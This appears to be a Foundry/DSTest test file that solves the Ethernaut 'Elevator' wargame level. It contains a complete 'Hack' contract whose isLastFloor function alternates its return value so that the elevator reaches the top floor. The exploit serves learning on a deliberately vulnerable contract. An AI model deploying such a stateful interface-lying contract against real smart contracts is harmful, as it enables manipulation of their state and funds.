pragma solidity ^0.8.10;

import "ds-test/test.sol";
// import "../Elevator/ElevatorHack.sol";
import "../Elevator/ElevatorFactory.sol";
import "../Ethernaut.sol";

contract ElevatorTest is DSTest {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testElevatorHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ElevatorFactory elevatorFactory = new ElevatorFactory();
        ethernaut.registerLevel(elevatorFactory);
        address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
        Elevator ethernautElevator = Elevator(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        Hack hack = new Hack(address(ethernautElevator));
        hack.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
    }
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract Hack {
    bool internal toggle = false;
    IElevator elevator;

    constructor(address _elevator) {
        elevator = IElevator(_elevator);
    }

    function isLastFloor(uint) external returns (bool) {
        bool val = toggle;
        toggle = !toggle;
        return val;
    }

    function attack() public {
        elevator.goTo(uint(10));
    }
}